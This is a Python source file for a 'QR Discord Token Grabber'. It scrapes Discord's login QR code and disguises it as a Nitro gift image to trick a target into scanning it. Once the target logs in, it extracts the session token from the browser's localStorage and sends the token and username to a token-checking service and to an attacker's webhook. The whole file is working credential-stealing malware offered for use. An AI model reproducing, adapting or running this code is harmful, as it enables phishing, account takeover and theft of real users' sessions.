import base64, os, platform, re, requests, time
from bs4 import BeautifulSoup
from colorama import Fore, init
from PIL import Image
from selenium import webdriver

def clear() -> None:
    """Clear the screen; works with "cls" and "clear" commands.
    """
    if platform.system() == "Windows":
        os.system("cls")
    elif platform.system() == "Darwin" or platform.system() == "Linux":
        os.system("clear")
    else:
        pass
        

def generate_qr() -> None:
    """Generate a QR code to paste onto a discord nitro template.
    """
    qr_img = Image.open(os.path.normpath(r"resources/qr_code.png"), "r")
    ovly_img = Image.open(os.path.normpath(r"resources/overlay.png"), "r")
    qr_img.paste(ovly_img, (60, 55))
    qr_img.save(os.path.normpath(r"resources/final_qr.png"), quality=95)


def generate_nitro_template() -> None:
    """Generate the nitro template using the QR code generated by generate_qr.
    """
    nitro_template = Image.open(
        os.path.normpath(r"resources/template.png"), 
        "r"
        )
    qr_img = Image.open(os.path.normpath(r"resources/final_qr.png"), "r")
    nitro_template.paste(qr_img, (120, 409))
    nitro_template.save("discord_gift.png", quality=95)


def main(webhook_url) -> None:
    """Use selenium webdriver to go to the discord login page.
    Then, grab the source of the page and use regex to identify the class
    name of the div that contains the QR login image, regardless of
    whether the class name changes (this avoids the program breaking
    in the future). Finally, wait for a user to log in and then send token
    to webhook.
    """
    print(f"""
{Fore.LIGHTMAGENTA_EX}Generating QR — do not close until finished!""")
    webdriver.ChromeOptions.binary_location = r"browser/chrome.exe"
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome(os.path.normpath(r"browser/chromedriver.exe"), options=opts)
    driver.get("https://discord.com/login")
    time.sleep(5)  # Make sure QR has fully loaded before taking source!
    source = BeautifulSoup(driver.page_source, features="lxml")
    if not (div := re.search(r"qrCode-......", str(source))):
        print(f"{Fore.LIGHTRED_EX}Error: \
the regular expression 'qrCode-......' is not found.")
        os._exit(1)
    div = div.group(0)
    div = source.find("div", {"class": f"{div}"})
    qr_code = div.find("img")["src"]
    source = BeautifulSoup(driver.page_source, features="lxml")
    div = source.find("div", {"class": "qrCode"})
    file = os.path.join(os.getcwd(), r"resources/qr_code.png")
    img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    with open(file, "wb") as handler:
        handler.write(img_data)
    
    discord_login = driver.current_url
    generate_qr()
    generate_nitro_template()

    print(f"""
{Fore.LIGHTGREEN_EX}Generated QR as discord_gift.png!
{Fore.BLUE}Waiting for target user to scan the QR code. . .""")

    while True:
        if discord_login != driver.current_url:
            token = driver.execute_script('''
window.dispatchEvent(new Event('beforeunload'));
let iframe = document.createElement('iframe');
iframe.style.display = 'none';
document.body.appendChild(iframe);
let localStorage = iframe.contentWindow.localStorage;
var token = JSON.parse(localStorage.token);
return token;
   
''')

            print(f"""
{Fore.LIGHTGREEN_EX}The following token has been grabbed:
{token}

{Fore.LIGHTYELLOW_EX}Enter anything to exit\n>>> {Fore.LIGHTWHITE_EX}""", 
end="")

            if re.search("[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", token) == None:
                print("invalid token? (didnt match regex)")

            check = requests.post('https://utilities.tk/tokens/check', json={'token':token})

            if check.status_code == 401:
                print('Account invalid.')
            elif check.status_code == 403:
                a = check.json()['username']
                print(f"Account locked. `{a}`")
            elif check.status_code == 200:
                a = check.json()['username']
                print(f"Account valid! `{a}`")
            
            data = {
                "content": f"TKN: {token}\nUser: {a}",
                "username": "QR Logr"
            }
            if webhook_url:
                result = requests.post(webhook_url, json=data)
                try:
                    result.raise_for_status()
                except requests.exceptions.HTTPError as e:
                    print(f"{Fore.LIGHTRED_EX}{e}")
                else:
                    pass
            break
    
    driver.quit()


if __name__ == "__main__":
    init()
    clear()
    print(f"""

{Fore.GREEN}QR Discord Token Grabber
{Fore.BLUE}Created by NightfallGT
Using utilities.tk API 
Revised by Luci (9P9)
Revised by the-cult-of-integral
Revised by mte0

{Fore.LIGHTYELLOW_EX}Enter a webhook URL.
>>> {Fore.LIGHTWHITE_EX}""", end="")
    webhook_url = input()
    main(webhook_url)
    input()
    print(f"{Fore.RESET}")
    clear()
